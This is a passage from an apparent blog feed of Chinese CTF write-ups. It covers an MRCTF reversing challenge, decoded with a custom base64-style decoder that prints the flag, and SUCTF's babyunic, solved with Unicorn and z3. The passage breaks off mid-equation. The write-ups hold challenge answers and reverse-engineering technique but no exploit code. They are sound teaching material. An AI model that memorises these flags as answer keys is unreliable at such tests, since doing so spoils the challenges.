offset byte_421708.text:004012C7                 mov     edx, [ebp-0Ch].text:004012CA                 add     edx, 1.text:004012CD                 mov     [ebp-28h], edx.text:004012D0.text:004012D0 loc_4012D0:                             ; CODE XREF: .text:004012E0↓j.text:004012D0                 mov     eax, [ebp-0Ch].text:004012D3                 mov     cl, [eax].text:004012D5                 mov     [ebp-2], cl.text:004012D8                 add     dword ptr [ebp-0Ch], 1.text:004012DC                 cmp     byte ptr [ebp-2], 0.text:004012E0                 jnz     short loc_4012D0.text:004012E2                 mov     edx, [ebp-0Ch].text:004012E5                 sub     edx, [ebp-28h].text:004012E8                 mov     [ebp-30h], edx.text:004012EB                 mov     dword ptr [ebp-10h], offset aBuedvshlmfwhpz ; &quot;%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(a&quot;....text:004012F2                 mov     eax, [ebp-10h].text:004012F5                 add     eax, 1.text:004012F8                 mov     [ebp-2Ch], eax.text:004012FB.text:004012FB loc_4012FB:                             ; CODE XREF: .text:0040130B↓j.text:004012FB                 mov     ecx, [ebp-10h].text:004012FE                 mov     dl, [ecx].text:00401300                 mov     [ebp-3], dl.text:00401303                 add     dword ptr [ebp-10h], 1.text:00401307                 cmp     byte ptr [ebp-3], 0.text:0040130B                 jnz     short loc_4012FB.text:0040130D                 mov     eax, [ebp-10h].text:00401310                 sub     eax, [ebp-2Ch].text:00401313                 mov     [ebp-34h], eax.text:00401316                 mov     ecx, [ebp-30h].text:00401319                 cmp     ecx, [ebp-34h].text:0040131C                 jz      short loc_401322.text:0040131E                 xor     al, al.text:00401320                 jmp     short loc_401387.text:00401322 ; ---------------------------------------------------------------------------.text:00401322.text:00401322 loc_401322:                             ; CODE XREF: .text:0040131C↑j.text:00401322                 mov     dword ptr [ebp-18h], 0.text:00401329                 jmp     short loc_401334.text:0040132B ; ---------------------------------------------------------------------------.text:0040132B.text:0040132B loc_40132B:                             ; CODE XREF: .text:loc_401383↓j.text:0040132B                 mov     edx, [ebp-18h].text:0040132E                 add     edx, 1.text:00401331                 mov     [ebp-18h], edx.text:00401334.text:00401334 loc_401334:                             ; CODE XREF: .text:00401329↑j.text:00401334                 mov     dword ptr [ebp-14h], offset byte_421708.text:0040133B                 mov     eax, [ebp-14h].text:0040133E                 add     eax, 1.text:00401341                 mov     [ebp-38h], eax.text:00401344.text:00401344 loc_401344:                             ; CODE XREF: .text:00401354↓j.text:00401344                 mov     ecx, [ebp-14h].text:00401347                 mov     dl, [ecx].text:00401349                 mov     [ebp-4], dl.text:0040134C                 add     dword ptr [ebp-14h], 1.text:00401350                 cmp     byte ptr [ebp-4], 0.text:00401354                 jnz     short loc_401344.text:00401356                 mov     eax, [ebp-14h].text:00401359                 sub     eax, [ebp-38h].text:0040135C                 mov     [ebp-3Ch], eax.text:0040135F                 mov     ecx, [ebp-18h].text:00401362                 cmp     ecx, [ebp-3Ch].text:00401365                 jnb     short loc_401385.text:00401367                 mov     edx, [ebp-18h].text:0040136A                 movsx   eax, byte_421708[edx].text:00401371                 mov     ecx, [ebp-18h].text:00401374                 movsx   edx, byte ptr aBuedvshlmfwhpz[ecx] ; &quot;%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(a&quot;....text:0040137B                 cmp     eax, edx.text:0040137D                 jz      short loc_401383.text:0040137F                 xor     al, al.text:00401381                 jmp     short loc_401387.text:00401383 ; ---------------------------------------------------------------------------.text:00401383.text:00401383 loc_401383:                             ; CODE XREF: .text:0040137D↑j.text:00401383                 jmp     short loc_40132B.text:00401385 ; ---------------------------------------------------------------------------.text:00401385.text:00401385 loc_401385:                             ; CODE XREF: .text:00401365↑j.text:00401385                 mov     al, 1.text:00401387.text:00401387 loc_401387:                             ; CODE XREF: .text:0040124C↑j.text:00401387                                         ; .text:00401320↑j ....text:00401387                 pop     edi.text:00401388                 pop     esi.text:00401389                 pop     ebx.text:0040138A                 mov     esp, ebp.text:0040138C                 pop     ebp.text:0040138D                 retn</code></pre><p>这些都很容易分析，可以看到先分奇偶分别进行了左右循环移位，<del>虽然我看不懂这迷惑的左右移四位是什么情况</del>，实际上就是每个字符前四位和后四位交换位置</p><p>然后调用了一个函数进行了处理，处理之后和已知的字符串进行对比，相同就返回正确，逻辑很简单，用来处理的函数如下</p><pre><code class="c++">char __fastcall sub_401090(char *a1, int a2)&#123;  int v2; // eax  signed int v3; // esi  int v4; // edi  char v5; // al  unsigned __int8 v6; // ah  unsigned __int8 v7; // dh  unsigned __int8 v8; // bh  unsigned __int8 v9; // dl  signed int v10; // eax  bool v11; // cf  unsigned __int8 v12; // cl  int i; // ecx  int v15; // [esp+8h] [ebp-14h]  char v16; // [esp+10h] [ebp-Ch]  char v17; // [esp+11h] [ebp-Bh]  char v18; // [esp+12h] [ebp-Ah]  char v19; // [esp+13h] [ebp-9h]  unsigned __int8 v20; // [esp+14h] [ebp-8h]  unsigned __int8 v21; // [esp+15h] [ebp-7h]  unsigned __int8 v22; // [esp+16h] [ebp-6h]  unsigned __int8 v23; // [esp+1Bh] [ebp-1h]  v2 = a2;  v3 = 0;  v4 = 0;  if ( a2 )  &#123;    do    &#123;      v15 = v2 - 1;      v5 = *a1++;      *(&amp;v20 + v3++) = v5;      v6 = v22;      v7 = v21;      v8 = v20;      v23 = v22;      if ( v3 == 3 )      &#123;        v9 = (v22 &gt;&gt; 6) + 4 * (v21 &amp; 0xF);        v17 = (v21 &gt;&gt; 4) + 16 * (v20 &amp; 3);        v18 = (v22 &gt;&gt; 6) + 4 * (v21 &amp; 0xF);        v19 = v22 &amp; 0x3F;        v16 = v20 &gt;&gt; 2;        byte_421708[v4] = byte_41EA00[v20 &gt;&gt; 2];        byte_421709[v4] = byte_41EA00[(unsigned __int8)((v7 &gt;&gt; 4) + 16 * (v8 &amp; 3))];        byte_42170A[v4] = byte_41EA00[v9];        byte_42170B[v4] = byte_41EA00[v6 &amp; 0x3F];        v4 += 4;        v3 = 0;      &#125;      v2 = v15;    &#125;    while ( v15 );    if ( v3 )    &#123;      v10 = v3;      if ( v3 &gt;= 3 )      &#123;        v12 = v23;      &#125;      else      &#123;        v11 = (unsigned int)v3 &lt; 3;        do        &#123;          if ( !v11 )          &#123;            sub_40150A(a1);            JUMPOUT(*(_DWORD *)algn_4011F3);          &#125;          *(&amp;v20 + v10++) = 0;          v11 = (unsigned int)v10 &lt; 3;        &#125;        while ( v10 &lt; 3 );        v12 = v22;        v7 = v21;        v8 = v20;      &#125;      v16 = v8 &gt;&gt; 2;      v17 = (v7 &gt;&gt; 4) + 16 * (v8 &amp; 3);      LOBYTE(v2) = v12 &gt;&gt; 6;      v19 = v12 &amp; 0x3F;      v18 = (v12 &gt;&gt; 6) + 4 * (v7 &amp; 0xF);      for ( i = 0; i &lt; v3 + 1; ++v4 )      &#123;        v2 = (unsigned __int8)*(&amp;v16 + i++);        LOBYTE(v2) = byte_41EA00[v2];        byte_421708[v4] = v2;      &#125;      if ( v3 &lt; 3 )        LOBYTE(v2) = sub_4022E0(&amp;byte_421708[v4], 46, 3 - v3);    &#125;  &#125;  return v2;&#125;</code></pre><p>这是一个类似于<code>base64</code>的一个编码过程，把三个字符转换成四个字符，只不过索引的计算用了一些位运算，仔细想一下很容易还原，到这里就可以把<code>flag</code>解出来了</p><pre><code class="python">target = &#39;%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(aGBsZ@ZpZn!oYGxnZm&#39;#%w&#39;flag = &#39;&#39;target1 = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)!@#$%^&amp;*(+/&#39;i = 0tmps = []# print(chr(0x2e))# print(len(target))while i &lt; len(target):    index0 = target1.index(target[i])    index1 = target1.index(target[i + 1])    index2 = target1.index(target[i + 2])    index3 = target1.index(target[i + 3])    i += 4    tmp1 = index0 * 4 + ((index1 &amp; 0x30) &gt;&gt; 4)    tmp2 = ((index1 &amp; 0xf) &lt;&lt; 4) + ((index2 &amp; 0x3c) &gt;&gt; 2)    tmp3 = ((index2 &amp; 3) &lt;&lt; 6) + index3    tmps.append(tmp1)    tmps.append(tmp2)    tmps.append(tmp3)for i in tmps:    tmp = (((i &amp; 0xf) &lt;&lt; 4) &amp; 0xff) + ((i &amp; 0xf0) &gt;&gt; 4)    flag += chr(tmp ^ 3)print(flag+&#39;&#125;&#39;)</code></pre><p>最后凑不齐三个字符，还有下面一套的编码方式，但我懒得看了……反正已经知道最后一个字符是<code>&#39;&#125;&#39;</code>，干脆直接略过，输出<code>flag</code></p><pre><code>MRCTF&#123;junkjunkjunkcodejunkjunkcodejunkcode&#125;</code></pre><p><del>也就这题有点意思</del></p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>就做了两道题，第一题直接溢出，第二题<code>shellcode</code>，第三题看了是格式化字符串任意写也没什么意思，就不多写了</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> MRCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>babyunic-攻防世界</title>
      <link href="/2020/03/27/babyunic-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
      <url>/2020/03/27/babyunic-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
      
        <content type="html"><![CDATA[<p>这是第一次接触<code>unicorn</code>的题目，也算是第一次用<code>z3</code>来解决题目，花了好长时间去熟悉<code>z3</code>和<code>unicorn</code>，确实很强大</p><span id="more"></span><p>打开来有个脚本</p><pre><code class="sh">LD_PRELOAD=./un.so.1 ./babyunic func</code></pre><p>逐个调用，看一下<code>babyunic</code></p><pre><code class="c++">undefined8 FUN_00100eb9(int param_1,long param_2)&#123;  int iVar1;  void *__s1;  void *pvVar2;    if (param_1 == 2) &#123;    puts(&quot;SUCTF 2019&quot;);    printf(&quot;input your flag:&quot;);    __s1 = malloc(0x200);    pvVar2 = malloc(0x200);    __isoc99_scanf(&amp;DAT_00101033,pvVar2);    FUN_00100cba(pvVar2,__s1,*(undefined8 *)(param_2 + 8),__s1);    iVar1 = memcmp(__s1,DWORD_ARRAY_00302020,0xa8);    if (iVar1 == 0) &#123;      puts(&quot;congratuation!&quot;);    &#125;    else &#123;      puts(&quot;fail!&quot;);    &#125;  &#125;  else &#123;    puts(&quot;no input files&quot;);  &#125;  return 0;&#125;</code></pre><p>输入一个字符串经过处理后和已知字符串进行对比，相同则通过，接下来看看处理的方法</p><pre><code class="c++">void FUN_00100cba(char *param_1,undefined8 param_2,char *param_3)&#123;  long lVar1;  void *__ptr;  size_t sVar1;  long in_FS_OFFSET;  undefined4 local_38;  undefined4 local_34;  int local_30;  undefined4 local_2c;  undefined8 local_28;  FILE *local_20;  void *local_18;  long local_10;    lVar1 = *(long *)(in_FS_OFFSET + 0x28);  local_20 = fopen(param_3,&quot;rb&quot;);  __ptr = malloc(0x7100);  fread(__ptr,1,0x7100,local_20);  local_38 = 0x101fffc0;  local_34 = 0x101fffc0;  local_30 = 0x101ffb00;  local_2c = 0x101ffa00;                    /* mips32大端序 */  uc_open(3,0x40000004,&amp;local_28);  uc_mem_map(local_28,0x400000,0x200000,7);  uc_mem_map(local_28,0x10000000,0x200000,7);  sVar1 = strlen(param_1);  uc_mem_write(local_28,(long)local_30,param_1,sVar1);  uc_mem_write(local_28,0x400000,__ptr,0x7100);  uc_reg_write(local_28,0x1f,&amp;local_38);  uc_reg_write(local_28,0x20,&amp;local_34);  uc_reg_write(local_28,7,&amp;local_2c);  uc_reg_write(local_28,6,&amp;local_30);  uc_emu_start(local_28,0x400000,0x40706c,0,0);  uc_mem_read(local_28,0x101ffa00,param_2,200);  uc_close(local_28);  fclose(local_20);  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) &#123;                    /* WARNING: Subroutine does not return */    __stack_chk_fail();  &#125;  return;&#125;</code></pre><p>这里用到了<code>unicorn</code>来模拟其它架构的处理器，查阅<code>unicorn</code>引用的头文件可以得到以下信息</p><pre><code class="c++">local_20 = fopen(param_3,&quot;rb&quot;);__ptr = malloc(0x7100);fread(__ptr,1,0x7100,local_20);//读取输入的文件funcuc_open(3,0x40000004,&amp;local_28);//第一个参数3代表mips架构，第二个参数代表mips32+大端序，第三个参数是句柄sVar1 = strlen(param_1);uc_mem_write(local_28,(long)local_30,param_1,sVar1);//param_1对应我们输入的字符串，放入local_30指向的地址，应该是栈uc_mem_write(local_28,0x400000,__ptr,0x7100);//func为可执行文件，0x400000凭经验是代码段uc_mem_read(local_28,0x101ffa00,param_2,200);//从栈上的某个地址读取200个字节到param_2里</code></pre><p>最后这个函数的输出是<code>param_2</code>也就是最终用来比较的<code>__s1</code>，所以接下来需要搞清楚<code>func</code>函数里进行了哪些操作</p><pre><code class="c++">void UndefinedFunction_00000000(byte *param_1,int *param_2)&#123;  int iStack16;  int iStack12;    iStack12 = 0;  while (param_1[iStack12] != 0) &#123;    iStack12 = iStack12 + 1;  &#125;  iStack16 = 0;  while (iStack16 &lt; iStack12) &#123;    param_1[iStack16] = (param_1[iStack16] &lt;&lt; 3 | param_1[iStack16] &gt;&gt; 5) ^ (byte)iStack16;    iStack16 = iStack16 + 1;  &#125;  *param_2 = ((((((((((((((((((((((((((((((((uint)*param_1 + (uint)param_1[1] + (uint)param_1[2]) -                                          (uint)param_1[3]) + (uint)param_1[4]) - (uint)param_1[5])                                       - (uint)param_1[6]) - (uint)param_1[7]) - (uint)param_1[8]) +                                     (uint)param_1[9] + (uint)param_1[10]) - (uint)param_1[0xb]) +                                  (uint)param_1[0xc]) - (uint)param_1[0xd]) - (uint)param_1[0xe]) +                               (uint)param_1[0xf]) - (uint)param_1[0x10]) - (uint)param_1[0x11]) +                             (uint)param_1[0x12] + (uint)param_1[0x13]) - (uint)param_1[0x14]) +                           (uint)param_1[0x15] + (uint)param_1[0x16] + (uint)param_1[0x17] +                          (uint)param_1[0x18]) - (uint)param_1[0x19]) + (uint)param_1[0x1a]) -                       (uint)param_1[0x1b]) + (uint)param_1[0x1c] + (uint)param_1[0x1d]) -                     (uint)param_1[0x1e]) - (uint)param_1[0x1f]) + (uint)param_1[0x20]) -                  (uint)param_1[0x21]) + (uint)param_1[0x22] + (uint)param_1[0x23]) -                (uint)param_1[0x24]) - (uint)param_1[0x25]) + (uint)param_1[0x26]) -             (uint)param_1[0x27]) + (uint)param_1[0x28] + (uint)param_1[0x29];  param_2[1] = (((((((((((((((((((((((((((((((((((uint)*param_1 - (uint)param_1[1]) +                                               (uint)param_1[2]) - (uint)param_1[3]) -                                             (uint)param_1[4]) + (uint)param_1[5]) -                                           (uint)param_1[6]) - (uint)param_1[7]) - (uint)param_1[8])                                        - (uint)param_1[9]) + (uint)param_1[10]) -                                      (uint)param_1[0xb]) + (uint)param_1[0xc]) - (uint)param_1[0xd]                                    ) - (uint)param_1[0xe]) + (uint)param_1[0xf]) -                                 (uint)param_1[0x10]) - (uint)param_1[0x11]) + (uint)param_1[0x12])                              - (uint)param_1[0x13]) + (uint)param_1[0x14] + (uint)param_1[0x15]) -                            (uint)param_1[0x16]) - (uint)param_1[0x17]) - (uint)param_1[0x18]) +                         (uint)param_1[0x19]) - (uint)param_1[0x1a]) + (uint)param_1[0x1b]) -                      (uint)param_1[0x1c]) - (uint)param_1[0x1d]) + (uint)param_1[0x1e] +                     (uint)param_1[0x1f] + (uint)param_1[0x20] + (uint)param_1[0x21] +                     (uint)param_1[0x22] + (uint)param_1[0x23]) - (uint)param_1[0x24]) -                  (uint)param_1[0x25]) - (uint)param_1[0x26]) - (uint)param_1[0x27]) -               (uint)param_1[0x28]) + (uint)param_1[0x29];  param_2[2] = ((((((((((((((((((((((((((((((uint)*param_1 - (uint)param_1[1]) + (uint)param_1[2] + ………………</code></pre><p>实在是太长了，就不放全了，可以看得出来<code>param_1</code>是我们的输入，经过一个处理之后用一系列复杂的方程计算出了<code>param_2</code></p><p>这个时候就要用<code>z3</code>一把梭解决问题了</p><p>首先对最终用于比较的字符进行一些处理</p><pre><code class="python">from z3 import *import ctypese = [0xFFFFFF94, 0xFFFFFF38, 0x00000126, 0xFFFFFF28, 0xFFFFFC10, 0x00000294, 0xFFFFFC9E, 0x000006EA, 0x000000DC,     0x00000006, 0xFFFFFF0C, 0xFFFFFDF6, 0xFFFFFA82, 0xFFFFFCD0, 0x00000182, 0x000003DE, 0x0000014E, 0x000002B2,     0xFFFFF8D8, 0x00000174, 0xFFFFFAA6, 0xFFFFF9D4, 0x000001C2, 0xFFFFF97C, 0x0000035A, 0x00000146, 0xFFFFFF3C,     0xFFFFFA14, 0x000001CE, 0x000007DC, 0xFFFFFD48, 0x00000098, 0x0000085E, 0xFFFFFDB0, 0xFFFFFFBC, 0x0000036E,     0xFFFFFF4E, 0xFFFFF836, 0x000005C0, 0x000006AE, 0x00000694, 0x00000022]en = map(lambda x: ctypes.c_int32(x).value, e)enc = [z3.IntVal(i) for i in en]</code></pre><p>在<code>babyunic</code>里是小端序存储，但是在<code>unicorn</code>里模拟的是32位大端序，需要进行一个转换，先是转换成大端序，然后转换成<code>c</code>的<code>int32</code>类型</p><pre><code class="python">c = [Int(&#39;c%d&#39; % i) for i in range(42)]flag = []solver = Solver()for v in c:    solver.add(v &gt;= 0x0)    solver.add(v &lt;= 0xff)</code></pre><p>设定好符号，添加约束为<code>ascii</code>码值，然后添加方程的约束</p><pre><code class="python">solver.add(enc[0] == (((((((((((((((((((((((((((((((c[0] + c[1] + c[2]) - c[3]) + c[4]) - c[5]) - c[6]) - c[7]) - c[    8]) + c[9] + c[10]) - c[0xb]) + c[0xc]) - c[0xd]) - c[0xe]) + c[0xf]) - c[0x10]) - c[0x11]) + c[0x12] + c[0x13]) -                                    c[0x14]) + c[0x15] + c[0x16] + c[0x17] + c[0x18]) - c[0x19]) + c[0x1a]) - c[0x1b]) +                               c[0x1c] + c[0x1d]) - c[0x1e]) - c[0x1f]) + c[0x20]) - c[0x21]) + c[0x22] + c[0x23]) - c[                             0x24]) - c[0x25]) + c[0x26]) - c[0x27]) + c[0x28] + c[0x29])solver.add(enc[1] == ((((((((((((((((((((((((((((((((((c[0] - c[1]) + c[2]) - c[3]) - c[4]) + c[5]) - c[6]) - c[7]) - c[    8]) - c[9]) + c[10]) - c[0xb]) + c[0xc]) - c[0xd]) - c[0xe]) + c[0xf]) - c[0x10]) - c[0x11]) + c[0x12]) - c[0x13]) +                                    c[0x14] + c[0x15]) - c[0x16]) - c[0x17]) - c[0x18]) + c[0x19]) - c[0x1a]) + c[                                  0x1b]) - c[0x1c]) - c[0x1d]) + c[0x1e] + c[0x1f] + c[0x20] + c[0x21] + c[0x22] + c[                               0x23]) - c[0x24]) - c[0x25]) - c[0x26]) - c[0x27]) - c[0x28]) + c[0x29])solver.add(enc[2] == (((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3]) - c[4]) + c[5]) - c[6]) - c[7]) + c[8]) -                                           c[9]) - c[10]) - c[0xb]) - c[0xc]) - c[0xd]) + c[0xe]) - c[0xf]) - c[0x10]) +                                   c[0x11] + c[0x12] + c[0x13] + c[0x14] + c[0x15]) - c[0x16]) + c[0x17] + c[0x18] + c[                                     0x19] + c[0x1a]) - c[0x1b]) + c[0x1c]) - c[0x1d]) + c[0x1e]) - c[0x1f]) + c[0x20] +                           c[0x21]) - c[0x22]) - c[0x23]) + c[0x24] + c[0x25] + c[0x26]) - c[0x27]) + c[0x28]) - c[               0x29])solver.add(enc[3] == (((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) - c[3]) - c[4]) - c[5]) + c[6] + c[7]) - c[    8]) - c[9]) - c[10]) - c[0xb]) + c[0xc]) - c[0xd]) + c[0xe]) - c[0xf]) + c[0x10]) - c[0x11]) + c[0x12] + c[0x13] +                                    c[0x14]) - c[0x15]) + c[0x16] + c[0x17] + c[0x18]) - c[0x19]) - c[0x1a]) + c[                                   0x1b]) - c[0x1c]) + c[0x1d] + c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) + c[0x22]) -                        c[0x23]) + c[0x24] + c[0x25] + c[0x26]) - c[0x27]) + c[0x28] + c[0x29])solver.add(enc[4] == (((((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) + c[3]) - c[4]) - c[5]) + c[6] + c[7] + c[    8] + c[9]) - c[10]) + c[0xb] + c[0xc]) - c[0xd]) + c[0xe]) - c[0xf]) + c[0x10] + c[0x11]) - c[0x12]) + c[0x13]) - c[                                            0x14]) + c[0x15]) - c[0x16]) - c[0x17]) - c[0x18]) + c[0x19]) - c[0x1a]) -                                 c[0x1b]) - c[0x1c]) + c[0x1d] + c[0x1e] + c[0x1f]) - c[0x20]) + c[0x21]) - c[0x22]) -                           c[0x23]) + c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[5] == ((((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3] + c[4] + c[5] + c[6] + c[7] + c[8]) - c[9]) -                                               c[10]) - c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) + c[0xf]) - c[0x10]) + c[                                            0x11]) - c[0x12]) + c[0x13] + c[0x14]) - c[0x15]) + c[0x16]) - c[0x17]) + c[                                      0x18]) - c[0x19]) + c[0x1a] + c[0x1b]) - c[0x1c]) + c[0x1d]) - c[0x1e]) + c[                                0x1f] + c[0x20] + c[0x21]) - c[0x22]) - c[0x23]) - c[0x24]) + c[0x25]) - c[0x26]) - c[                          0x27]) + c[0x28] + c[0x29])solver.add(enc[6] == (((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3] + c[4]) - c[5]) + c[6] + c[7] + c[8] + c[    9]) - c[10]) + c[0xb] + c[0xc]) - c[0xd]) + c[0xe] + c[0xf] + c[0x10] + c[0x11]) - c[0x12]) - c[0x13]) - c[0x14]) -                                     c[0x15]) - c[0x16]) - c[0x17]) + c[0x18] + c[0x19]) - c[0x1a]) + c[0x1b] + c[                                    0x1c] + c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[0x22]) - c[0x23]) +                         c[0x24] + c[0x25]) - c[0x26]) - c[0x27]) + c[0x28]) - c[0x29])solver.add(enc[7] == ((((((((((((((((((((((((((((((c[0] + c[1]) - c[2]) - c[3]) - c[4]) + c[5] + c[6]) - c[7]) + c[8] +                                             c[9]) - c[10]) + c[0xb]) - c[0xc]) + c[0xd]) - c[0xe]) + c[0xf]) - c[                                          0x10]) + c[0x11]) - c[0x12]) - c[0x13]) + c[0x14]) - c[0x15]) + c[0x16]) - c[                                   0x17]) - c[0x18]) + c[0x19]) - c[0x1a]) + c[0x1b] + c[0x1c] + c[0x1d] + c[0x1e] + c[                               0x1f] + c[0x20]) - c[0x21]) + c[0x22]) - c[0x23]) + c[0x24] + c[0x25] + c[0x26] + c[                           0x27]) - c[0x28]) - c[0x29])solver.add(enc[8] == (((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) + c[3] + c[4]) - c[5]) + c[6] + c[7] + c[8] + c[    9] + c[10]) - c[0xb]) - c[0xc]) + c[0xd]) - c[0xe]) + c[0xf] + c[0x10] + c[0x11] + c[0x12]) - c[0x13]) + c[0x14] +                                       c[0x15]) - c[0x16]) - c[0x17]) + c[0x18] + c[0x19] + c[0x1a]) - c[0x1b]) + c[                                      0x1c]) - c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) + c[0x22]) - c[                               0x23]) - c[0x24]) + c[0x25]) - c[0x26]) - c[0x27]) + c[0x28]) - c[0x29])solver.add(enc[9] == (((((((((((((((((((((((((((((c[0] + c[1] + c[2]) - c[3]) + c[4] + c[5] + c[6]) - c[7]) - c[8]) - c[    9]) - c[10]) + c[0xb] + c[0xc] + c[0xd]) - c[0xe]) + c[0xf] + c[0x10]) - c[0x11]) - c[0x12]) + c[0x13] + c[0x14]) -                                     c[0x15]) - c[0x16]) - c[0x17]) + c[0x18]) - c[0x19]) - c[0x1a]) - c[0x1b]) + c[                                  0x1c] + c[0x1d] + c[0x1e]) - c[0x1f]) + c[0x20] + c[0x21]) - c[0x22]) - c[0x23]) - c[                             0x24]) - c[0x25]) + c[0x26]) - c[0x27]) + c[0x28] + c[0x29])solver.add(enc[10] == ((((((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3]) - c[4]) - c[5]) + c[6] + c[7]) - c[    8]) - c[9]) - c[10]) - c[0xb]) + c[0xc] + c[0xd] + c[0xe]) - c[0xf]) + c[0x10]) - c[0x11]) + c[0x12] + c[0x13] + c[                                             0x14]) - c[0x15]) + c[0x16]) - c[0x17]) - c[0x18]) - c[0x19]) + c[0x1a]) -                                  c[0x1b]) - c[0x1c]) + c[0x1d]) - c[0x1e]) + c[0x1f] + c[0x20]) - c[0x21]) - c[0x22]) +                           c[0x23]) - c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) + c[0x28] + c[0x29])solver.add(enc[0xb] == ((((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3] + c[4]) - c[5]) + c[6] + c[7]) - c[8]) +                                                c[9] + c[10]) - c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) + c[0xf]) - c[                                              0x10]) - c[0x11]) - c[0x12]) + c[0x13] + c[0x14]) - c[0x15]) + c[0x16]) -                                    c[0x17]) + c[0x18] + c[0x19] + c[0x1a] + c[0x1b]) - c[0x1c]) + c[0x1d] + c[0x1e]) -                                c[0x1f]) - c[0x20]) - c[0x21]) - c[0x22]) - c[0x23]) + c[0x24] + c[0x25]) - c[0x26]) -                         c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0xc] == (((((((((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) - c[3]) + c[4]) - c[5]) - c[6]) + c[    7] + c[8]) - c[9]) + c[10]) - c[0xb]) - c[0xc]) - c[0xd]) + c[0xe]) - c[0xf]) + c[0x10]) - c[0x11]) + c[0x12]) - c[                                               0x13]) - c[0x14]) - c[0x15]) - c[0x16]) + c[0x17]) - c[0x18]) + c[                                         0x19]) - c[0x1a]) + c[0x1b]) - c[0x1c]) + c[0x1d]) - c[0x1e]) - c[0x1f]) + c[                                  0x20] + c[0x21] + c[0x22]) - c[0x23]) - c[0x24]) - c[0x25]) - c[0x26]) + c[0x27]) - c[                            0x28]) - c[0x29])solver.add(enc[0xd] == (((((((((((((((((((((((((((((((((c[0] - c[1]) + c[2]) - c[3]) + c[4]) - c[5]) + c[6]) - c[7]) +                                                 c[8]) - c[9]) + c[10]) - c[0xb]) + c[0xc] + c[0xd] + c[0xe] + c[0xf]) -                                            c[0x10]) - c[0x11]) - c[0x12]) + c[0x13] + c[0x14] + c[0x15]) - c[0x16]) -                                       c[0x17]) + c[0x18] + c[0x19]) - c[0x1a]) - c[0x1b]) + c[0x1c] + c[0x1d]) - c[                                      0x1e]) - c[0x1f]) - c[0x20]) + c[0x21]) - c[0x22]) - c[0x23]) + c[0x24]) - c[                               0x25]) - c[0x26]) - c[0x27]) + c[0x28]) - c[0x29])solver.add(enc[0xe] == (((((((((((((((((((((((((c[0] + c[1] + c[2]) - c[3]) - c[4]) - c[5]) + c[6]) - c[7]) + c[8] + c[    9] + c[10]) - c[0xb]) + c[0xc]) - c[0xd]) - c[0xe]) + c[0xf] + c[0x10] + c[0x11]) - c[0x12]) - c[0x13]) - c[0x14]) -                                 c[0x15]) + c[0x16] + c[0x17] + c[0x18]) - c[0x19]) + c[0x1a] + c[0x1b] + c[0x1c]) - c[                                 0x1d]) - c[0x1e]) - c[0x1f]) + c[0x20] + c[0x21] + c[0x22] + c[0x23] + c[0x24] + c[                              0x25] + c[0x26]) - c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0xf] == ((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3] + c[4] + c[5]) - c[6]) + c[7]) - c[8]) - c[    9]) - c[10]) + c[0xb] + c[0xc] + c[0xd]) - c[0xe]) - c[0xf]) - c[0x10]) + c[0x11]) - c[0x12]) - c[0x13]) - c[                                       0x14]) - c[0x15]) + c[0x16] + c[0x17] + c[0x18] + c[0x19] + c[0x1a] + c[0x1b]) -                                c[0x1c]) - c[0x1d]) - c[0x1e]) - c[0x1f]) + c[0x20]) - c[0x21]) + c[0x22] + c[0x23] + c[                              0x24] + c[0x25]) - c[0x26]) + c[0x27] + c[0x28]) - c[0x29])solver.add(enc[0x10] == ((((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3]) - c[4]) - c[5]) + c[6] + c[7] + c[8] +                                                  c[9] + c[10]) - c[0xb]) + c[0xc]) - c[0xd]) + c[0xe] + c[0xf] + c[                                                  0x10]) - c[0x11]) + c[0x12]) - c[0x13]) + c[0x14]) - c[0x15]) - c[                                            0x16]) - c[0x17]) - c[0x18]) - c[0x19]) + c[0x1a] + c[0x1b] + c[0x1c] + c[                                        0x1d]) - c[0x1e]) - c[0x1f]) + c[0x20]) - c[0x21]) - c[0x22]) + c[0x23]) - c[                                 0x24]) + c[0x25]) - c[0x26]) + c[0x27]) - c[0x28]) + c[0x29])solver.add(enc[0x11] == ((((((((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3] + c[4]) - c[5]) + c[6] + c[7] + c[    8]) - c[9]) - c[10]) + c[0xb]) - c[0xc]) + c[0xd] + c[0xe] + c[0xf]) - c[0x10]) + c[0x11]) - c[0x12]) - c[0x13]) +                                            c[0x14]) - c[0x15]) + c[0x16]) - c[0x17]) - c[0x18]) + c[0x19]) - c[0x1a]) +                                     c[0x1b]) - c[0x1c]) + c[0x1d]) - c[0x1e]) - c[0x1f]) + c[0x20]) - c[0x21]) - c[                                  0x22]) + c[0x23]) - c[0x24]) + 